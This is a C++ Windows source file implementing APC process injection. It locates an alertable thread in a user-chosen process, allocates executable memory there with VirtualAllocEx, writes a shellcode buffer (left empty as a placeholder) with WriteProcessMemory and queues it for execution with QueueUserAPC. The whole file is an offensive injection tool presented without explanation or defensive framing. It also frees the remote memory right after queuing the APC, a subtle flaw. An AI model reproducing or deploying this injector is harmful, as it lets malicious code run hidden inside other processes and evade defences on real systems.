#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

using namespace std;

HANDLE findAlertableThread(DWORD pId) {
	THREADENTRY32 thread32 = {sizeof(THREADENTRY32)};
	HANDLE targetProcessThreadArray[MAXIMUM_WAIT_OBJECTS], threadHandle;
	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pId);
	DWORD threadCount = 0;
	if (!Thread32First(threadSnapshot, &thread32)) {
		cout << "Error: coudn't get first thread from process snapshot (" << GetLastError() << ")" << endl;
		return 0;
	}
	do
	{
		if (thread32.th32OwnerProcessID != pId) continue;
		threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread32.th32ThreadID);
		if (threadHandle !=INVALID_HANDLE_VALUE && threadHandle != NULL) {
			targetProcessThreadArray[threadCount] = threadHandle;
		}
		threadCount++;
		if (threadCount == MAXIMUM_WAIT_OBJECTS) {
			break;
		}
	} while (Thread32Next(threadSnapshot, &thread32));

	// Creating Events
	HANDLE hEvents[MAXIMUM_WAIT_OBJECTS];
	for (DWORD i = 0; i < threadCount; i++) {
		hEvents[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
	}
	
	// Duplicating Handles to Events Objects (to remote thread)
	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
	HANDLE hTargetEvents[MAXIMUM_WAIT_OBJECTS];
	for (DWORD i = 0; i < threadCount; i++) {
		DuplicateHandle(GetCurrentProcess(), hEvents[i], hTargetProcess, &hTargetEvents[i],0,FALSE, DUPLICATE_SAME_ACCESS);
	}

	for (DWORD i = 0; i < threadCount; i++) {
		QueueUserAPC((PAPCFUNC)&SetEvent, targetProcessThreadArray[i], (ULONG_PTR)hTargetEvents[i]);
	}

	DWORD tEvent = WaitForMultipleObjects(threadCount, hEvents, FALSE, 10000);

	// Get Alertable Thread by event that was signaled
	HANDLE hAlertableThread = NULL;
	if (tEvent != WAIT_TIMEOUT) {
		hAlertableThread = targetProcessThreadArray[tEvent];
	}
	for (DWORD i = 0; i < threadCount; i++) {
		DuplicateHandle(hTargetProcess, hTargetEvents[i], GetCurrentProcess(), &hEvents[i], 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hEvents[i]);
		if (targetProcessThreadArray[i] != hAlertableThread) {
			CloseHandle(targetProcessThreadArray[i]);
		}
	}
	CloseHandle(threadSnapshot);
	return hAlertableThread;
	

}

void injectAPC(HANDLE hThread, DWORD processId) {
	unsigned char b[] = ""; // Shellcode
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	LPVOID address = NULL;
	address = VirtualAllocEx(hProcess, NULL, sizeof(b), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	SIZE_T bytesWriten;
	WriteProcessMemory(hProcess, address, b, sizeof(b), &bytesWriten);
	QueueUserAPC((PAPCFUNC)address, hThread, NULL);
	VirtualFreeEx(hProcess, address, bytesWriten, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

}

int main() {
	DWORD processId = 0;
	cout << "Enter process Id: ";
	cin >> processId;
	if (!processId) {
		cout << "Error: you need to enter an integer between 1 - 65536" << endl;
		return 0;
	}
	HANDLE hAlertableThread = findAlertableThread(processId);
	DWORD threadId = GetThreadId(hAlertableThread);
	cout << "Aletable Thread Handle: " << hAlertableThread << " and Thread Id: " << threadId << endl;
	injectAPC(hAlertableThread, processId);
	return 1;
}